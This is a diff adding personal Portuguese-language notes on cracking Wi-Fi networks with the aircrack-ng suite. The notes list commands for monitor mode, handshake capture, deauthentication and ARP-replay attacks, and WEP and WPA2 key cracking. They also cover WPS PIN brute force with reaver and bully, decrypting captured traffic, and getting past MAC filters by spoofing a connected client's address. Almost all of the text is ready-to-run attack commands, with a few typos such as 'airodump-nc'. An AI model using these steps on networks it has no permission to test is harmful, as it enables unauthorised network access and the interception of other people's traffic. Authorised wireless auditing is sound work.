@@ -1,0 +1,87 @@
+Aircrack ng
+
+-Habilitar modo promisco:
+#airmon-ng check
+#airmon-ng check kill
+#airmon-ng start wlan0
+
+-Verificar adaptador:
+#iwconfig
+#tcpdump -i wlan0mon
+
+-Caso necessario, alterar o canal do adaptador:
+#iwconfig wlan0mon channel 1
+
+-Scan das redes proximas:
+#airodump-ng wlan0mon
+
+-Capturando pacotes da rede:
+#airodump-ng -c 1 --bssid XX:XX:XX:XX:XX:XX -w rede.pcap wlan0mon
+
+-Em outro terminal, gerar trafego na rede (WEP)
+#aireplay-ng  -3 -b XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX wlan0mona (WEP)
+#aireplay-ng  -0 10 -a XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX wlan0mon (WPA2)
+	-0 = Ataque de deauth
+	-a = Access Point (BSSID)
+	-c = client (STATION)
+	-h = STATION conectada na rede
+	-b = Rede
+	-3 = Ataque arpreplay
+	-Em ataques em rede WEB, é necessario ter ao menos 10000 entradas no campo Data
+
+-WEP Em paralelo, rodar o aircrack-ng para quebrar a senha
+#aircrack-ng rede.pcap
+
+-WPA2 - Rodar o aircrack passando a wordlist
+#aircrack-ng rede.pcap -w wordlist.txt
+
+
+-WPS:	-Identificar redes com WPS habilitado
+	#wash -i wlan0mon -C
+	#airodump-ng wlan0mon --wps
+
+	-Realizar o brute force do BSSID com WPS
+	#bully wlan0mon -b XX:XX:XX:XX:XX -e REDE -c 1
+	#reaver -i wlan0mon -b XX:XX:XX:XX:XX -vv -K 1
+	#reaver -i wlan0mon -b XX:XX:XX:XX:XX -vv -K 1 -P
+	#reaver -i wlan0mon -b XX:XX:XX:XX:XX -vv
+		-Caso o equipamento trave, usar timeout ou delay
+	
+
+
+-Uma vez tendo a chave, é possivel abrir o arquivo pcap, para identificar o trafego descriptografado:
+#airdecap-ng -w XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX rede.pcap
+	-Sera gerado o arquivo "rede-dec.pcap"
+
+-Abrir o arquivo com wireshark:
+#wireshark rede-dec.pcap
+
+
+
+OBS:     *O WEB é sempre vulneravel a quebra da senha por uma vulnerabilidade na criptografia
+	 *O WPA2, é necessario que haja um handshake, para que a chave trafegue na rede, podendo ser quebrada via brute force
+
+
+################################################
+
+-Burlando filtro de MAC
+#airodump-nc -c 1 --bssid XX:XX:XX:XX:XX:XX wlan0mon
+
+-Coletando o MAC da STATION conectada a rede, pelo airodamp
+
+-Parar o monitor de rede
+#airmon-ng stop wlan0
+#ifconfig wlan0mon down
+
+-Alterando o MAC
+#macchanger -m <MAC_STATION> wlan0mon
+
+-Subindo o adaptador:
+#ifconfig wlan0mon up
+
+-Iniciar o network-manager
+#service network-manager start
+
+-Nesse instante, ja é possivel acessar a rede
+
+
